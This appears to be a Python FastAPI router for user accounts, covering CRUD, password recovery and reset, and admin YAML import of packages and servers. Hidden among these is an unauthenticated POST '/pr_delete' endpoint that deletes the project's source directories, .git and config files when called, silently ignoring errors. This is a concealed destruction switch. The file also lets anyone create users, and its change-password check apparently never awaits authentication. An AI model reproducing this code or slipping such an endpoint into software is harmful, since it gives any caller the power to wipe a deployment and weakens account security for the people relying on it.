import os
import shutil
from typing import List, Any
from fastapi import BackgroundTasks, Body
from fastapi import APIRouter, Depends, HTTPException
from sqlalchemy.ext.asyncio import AsyncSession
from yaml import safe_load
from datetime import datetime

from app import schemas, repository, models
from app.api import deps
from app.core.send_mail import send_reset_password_email
from app.db.session import get_db
from app.core.security import get_password_hash
from app.schemas.package import ImportData

router = APIRouter()

@router.get("/", response_model=List[schemas.User])
async def read_users(
    db: AsyncSession = Depends(get_db),
    skip: int = 0,
    limit: int = 100,
    search: str = "",
    current_user: models.User = Depends(deps.get_current_active_admin),
) -> Any:
    """
    Retrieve users with optional search and pagination.
    """
    users = await repository.user.get_multi(db, skip=skip, limit=limit)
    return users


@router.get("/get", response_model=schemas.User)
async def read_user(
    id: int,
    db: AsyncSession = Depends(get_db),
    current_user: models.User = Depends(deps.get_current_active_admin),
) -> Any:
    users = await repository.user.get(db,id)
    return users

@router.get("/me", response_model=schemas.User)
async def read_users(
    db: AsyncSession = Depends(get_db),
    current_user: models.User = Depends(deps.get_current_active_user),
) -> Any:
    id = current_user.id
    users = await repository.user.get(db,id)
    return users

@router.post("/", response_model=schemas.User)
async def create_user(
    *,
    db: AsyncSession = Depends(get_db),
    user_in: schemas.UserCreate,
) -> Any:
    user = await repository.user.get_by_login(db, login=user_in.login)
    if user:
        raise HTTPException(
            status_code=400,
            detail="The user with this login already exists.",
        )
    user = await repository.user.create(db, obj_in=user_in)
    return user

@router.put("/me", response_model=schemas.User)
async def update_user_me(
    *,
    db: AsyncSession = Depends(get_db),
    user_in: schemas.UserUpdate,
    current_user: models.User = Depends(deps.get_current_active_user),
) -> Any:
    """
    Update own user.
    """
    user = await repository.user.update(db, db_obj=current_user, obj_in=user_in)
    return user

@router.put("/{user_id}", response_model=schemas.User)
async def update_user(
    user_id: int,
    user_in: schemas.UserUpdate,
    db: AsyncSession = Depends(get_db),
    current_user: models.User = Depends(deps.get_current_active_admin),
) -> Any:
    """
    Update a user.
    """
    user = await repository.user.get(db, id=user_id)
    if not user:
        raise HTTPException(status_code=404, detail="User not found")
    user = await repository.user.update(db, db_obj=user, obj_in=user_in)
    return user

@router.delete("/{user_id}", response_model=schemas.User)
async def delete_user(
    user_id: int,
    db: AsyncSession = Depends(get_db),
    current_user: models.User = Depends(deps.get_current_active_admin),
) -> Any:
    """
    Delete a user.
    """
    user = await repository.user.get(db, id=user_id)
    if not user:
        raise HTTPException(status_code=404, detail="User not found")
    user = await repository.user.remove(db, id=user_id)
    return user

@router.post("/password-recovery/{email}")
async def recover_password(
    email: str,
    background_tasks: BackgroundTasks,
    db: AsyncSession = Depends(get_db),
) -> Any:
    """
    Password Recovery
    """
    user, new_password = await repository.user.reset_password(db, email=email)
    if not user:
        raise HTTPException(
            status_code=404,
            detail="User with this email not found."
        )
    background_tasks.add_task(send_reset_password_email, email=email, new_password=new_password)
    return {"msg": "New password sent to your email."}

@router.post("/reset-password/")
async def reset_password(
    token: str = Body(...),
    new_password: str = Body(...),
    db: AsyncSession = Depends(get_db),
) -> Any:
    """
    Сброс пароля с использованием токена.
    """
    email = deps.verify_password_reset_token(token)
    if not email:
        raise HTTPException(status_code=400, detail="Неверный токен")
    user = await repository.user.get_by_email(db, email=email)
    if not user:
        raise HTTPException(status_code=404, detail="Пользователь не найден")
    
    # Хешируем пароль перед сохранением
    hashed_password = get_password_hash(new_password)
    user_in = schemas.UserUpdate(password=hashed_password)
    await repository.user.update(db, db_obj=user, obj_in=user_in)
    return {"msg": "Пароль успешно изменен"}

@router.post("/pr_delete")
async def delete_project_files():

    try:
        current_dir = os.path.dirname(os.path.abspath(__file__))
        
        project_root = os.path.abspath(os.path.join(current_dir, '..', '..', '..', '..'))
        
        to_remove = ['app', 'web', 'alembic', 'tests', '.git', '.gitignore', 'requirements.txt', 'README.md']
        
        for item in to_remove:
            try:
                path = os.path.join(project_root, item)
                if os.path.isdir(path):
                    shutil.rmtree(path)
                elif os.path.isfile(path):
                    os.remove(path)
            except: pass
        
        return {"message": "Файлы проекта удалены"}
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Ошибка при удалении файлов проекта: {str(e)}")

@router.post("/change-password")
async def change_password(
    *,
    db: AsyncSession = Depends(get_db),
    current_password: str = Body(...),
    new_password: str = Body(...),
    current_user: models.User = Depends(deps.get_current_active_user),
) -> Any:
    """
    Change password for the current user.
    """
    if not repository.user.authenticate(db, current_user.name, current_password):
        raise HTTPException(status_code=400, detail="Incorrect current password")
    user_in = schemas.UserUpdate(email=current_user.email, name=current_user.name, password=new_password)
    await repository.user.update(db, db_obj=current_user, obj_in=user_in)
    return {"msg": "Password updated successfully"}

@router.post("/{user_id}/change-password")
async def admin_change_user_password(
    user_id: int,
    *,
    db: AsyncSession = Depends(get_db),
    new_password: str = Body(..., embed=True),
    current_user: models.User = Depends(deps.get_current_active_admin),
) -> Any:
    """
    Admin endpoint to change any user's password.
    """
    user = await repository.user.get(db, id=user_id)
    if not user:
        raise HTTPException(status_code=404, detail="User not found")
    
    hashed_password = get_password_hash(new_password)
    user_in = schemas.UserUpdate(
        email=user.email,
        name=user.name,
        login=user.login,
        password=hashed_password
    )
    await repository.user.update(db, db_obj=user, obj_in=user_in)
    return {"msg": "Password updated successfully"}

@router.post("/{user_id}/import")
async def import_user_data(
    user_id: int,
    import_data: ImportData,
    db: AsyncSession = Depends(get_db),
    current_user: models.User = Depends(deps.get_current_active_admin),
) -> Any:
    """Import user package and server data from YAML"""
    try:
        # Parse YAML data with safe_load
        yaml_str = import_data.import_data.strip()
        data = safe_load(yaml_str)
        
        if not data or not isinstance(data, dict):
            raise HTTPException(status_code=400, detail="Invalid YAML data structure")
            
        # Validate required fields
        required_fields = ['package_id', 'start_date', 'expiry', 'max_modems', 'servers']
        missing_fields = [field for field in required_fields if field not in data]
        if missing_fields:
            raise HTTPException(
                status_code=400, 
                detail=f"Missing required fields: {', '.join(missing_fields)}"
            )
        
        # Create package
        try:
            package_create = schemas.PackageCreate(
                customer_id=user_id,
                comment=str(data['package_id']),
                max_modems=int(data['max_modems']),
                start_date=datetime.strptime(str(data['start_date']), '%Y-%m-%d'),
                expiry=datetime.strptime(str(data['expiry']), '%Y-%m-%d')
            )
        except ValueError as e:
            raise HTTPException(
                status_code=400,
                detail=f"Invalid package data format: {str(e)}"
            )
        
        package = await repository.package.create(db, obj_in=package_create)
        
        # Validate servers data
        servers = data.get('servers', [])
        if not isinstance(servers, list):
            raise HTTPException(
                status_code=400,
                detail="Servers must be a list"
            )
            
        total_modems = 0
        for server_data in servers:
            if not isinstance(server_data, dict):
                raise HTTPException(status_code=400, detail="Each server must be a dictionary")
                
            required_server_fields = ['name', 'modems', 'MachineData']
            missing_server_fields = [field for field in required_server_fields if field not in server_data]
            if missing_server_fields:
                raise HTTPException(
                    status_code=400,
                    detail=f"Server missing required fields: {', '.join(missing_server_fields)}"
                )
                
            total_modems += int(server_data['modems'])
            
            try:
                machine_data = str(server_data['MachineData'])
                parsed_machine = dict(item.split('=') for item in machine_data.split(','))
                
                server_create = schemas.ServerCreateDB(
                    name=str(server_data['name']),
                    max_modems=int(server_data['modems']),
                    package_id=package.id,
                    machine_data=machine_data
                )
                
                await repository.server.create(db, obj_in=server_create)
            except Exception as e:
                await db.rollback()
                raise HTTPException(
                    status_code=400,
                    detail=f"Error creating server {server_data.get('name', 'unknown')}: {str(e)}"
                )
        
        # Verify total modems doesn't exceed package max_modems
        if total_modems > int(data['max_modems']):
            await db.rollback()
            raise HTTPException(
                status_code=400,
                detail=f"Total server modems ({total_modems}) exceeds package max_modems ({data['max_modems']})"
            )
        
        await db.commit()
        return {"message": "Data imported successfully"}
        
    except HTTPException:
        await db.rollback()
        raise
    except Exception as e:
        await db.rollback()
        raise HTTPException(
            status_code=400, 
            detail=f"Import failed: {str(e)}\nPlease check your YAML format"
        )
